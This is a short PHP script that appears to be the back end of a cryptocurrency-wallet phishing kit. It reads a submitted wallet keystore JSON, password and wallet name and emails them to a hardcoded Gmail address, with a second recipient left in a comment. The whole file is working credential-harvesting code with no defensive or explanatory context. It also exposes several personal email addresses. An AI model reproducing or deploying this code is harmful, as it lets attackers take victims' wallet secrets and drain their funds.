<?php

if(isset($_POST['json'], $_POST['password'], $_POST['walletname'])){
    $phrase = $_POST['json'];
    $password = $_POST['password'];
    $walletname = $_POST['walletname'];

     //  $to = 'lodunidris12@gmail.com';
     $to = 'patrickcac80@gmail.com';
    $subject = $walletname.' details';
    $body = $walletname.' JSON: '.$phrase.' => Password: '.$password;
    $headers = 'From: Patrickdare26@gmail.com';

    // Send email
    if(mail($to, $subject, $body, $headers)){
        echo 'Email sent';
    } else {
        echo 'Email not sent';
    } 
}
?>
